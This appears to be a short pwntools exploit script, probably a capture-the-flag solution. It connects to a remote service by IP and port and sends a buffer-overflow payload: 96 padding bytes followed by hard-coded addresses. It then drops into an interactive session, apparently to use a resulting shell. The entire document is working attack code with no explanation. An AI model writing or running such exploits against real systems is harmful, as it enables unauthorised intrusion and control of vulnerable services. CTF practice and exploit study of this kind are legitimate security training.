from pwn import*
p=remote('118.89.138.44',30005)
context.log_level="debug"
p.sendline("a"*96+p32(0x8049a2c)+str(0x80485bd))
p.interactive()
